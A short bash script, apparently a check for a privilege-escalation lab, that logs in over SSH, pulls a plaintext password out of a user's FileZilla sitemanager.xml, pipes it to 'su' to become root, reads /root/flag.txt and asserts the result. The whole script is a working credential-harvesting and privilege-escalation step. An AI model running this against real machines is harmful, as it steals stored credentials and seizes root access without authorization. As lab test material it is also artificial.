#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'PASS=$(sed -n "s/.*<Pass encoding=\"plain\">\\([^<]*\\)<.*/\\1/p" /home/lowpriv/.config/filezilla/sitemanager.xml); printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
